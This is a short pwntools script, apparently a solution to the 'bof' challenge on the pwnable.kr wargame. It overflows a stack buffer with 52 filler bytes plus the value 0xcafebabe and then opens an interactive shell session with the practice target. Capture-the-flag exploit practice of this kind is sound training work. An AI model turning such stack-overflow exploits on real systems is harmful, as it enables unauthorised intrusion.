from pwn import *

if args.REMOTE:
    r = remote('pwnable.kr', 9000)
else:
    r = process('./bof')

offset = 52
payload = b'A'*offset + p32(0xcafebabe)

r.send(payload)

r.interactive()